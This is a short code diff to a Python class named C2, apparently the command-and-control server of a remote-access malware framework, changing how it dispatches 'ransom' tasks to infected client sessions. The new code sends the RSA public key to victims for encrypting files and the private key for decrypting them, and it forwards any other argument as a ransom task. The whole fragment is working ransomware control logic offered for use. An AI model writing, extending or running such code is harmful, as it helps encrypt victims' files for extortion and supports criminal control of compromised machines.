@@ -660,11 +660,11 @@ class C2():
         """
         if self.current_session:
             if 'decrypt' in str(args):
-                self.current_session.send_task({"task": "ransom decrypt %s" % self.current_session.rsa.exportKey()})
+                self.current_session.send_task({"task": "ransom {} {}".format(args, self.current_session.rsa.exportKey())})
             elif 'encrypt' in str(args):
-                self.current_session.send_task({"task": "ransom %s" % args})
+                self.current_session.send_task({"task": "ransom {} {}".format(args, self.current_session.rsa.publickey().exportKey())})
             else:
-                util.log("Error: invalid option '%s'" % args)
+                self.current_session.send_task({"task": "ransom {}".format(args)})
         else:
             util.log("No client selected")
 
